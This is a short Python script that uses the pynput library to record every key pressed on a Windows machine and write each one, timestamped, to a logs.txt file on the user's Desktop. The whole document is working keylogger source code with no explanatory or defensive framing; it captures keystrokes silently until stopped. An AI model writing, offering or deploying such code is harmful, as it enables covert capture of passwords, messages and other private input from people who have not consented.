from pynput.keyboard import Listener
import os
import logging
from shutil import copyfile

username = os.getlogin()
logging_directory = f"C:/Users/{username}/OneDrive/Desktop"
file = open(f"C:/Users/{username}/OneDrive/Desktop/logs.txt","w")

logging.basicConfig(filename=f"{logging_directory}/logs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
def key_handler(key):
    logging.info(key)
with Listener(on_press =key_handler) as listener:
    listener.join()

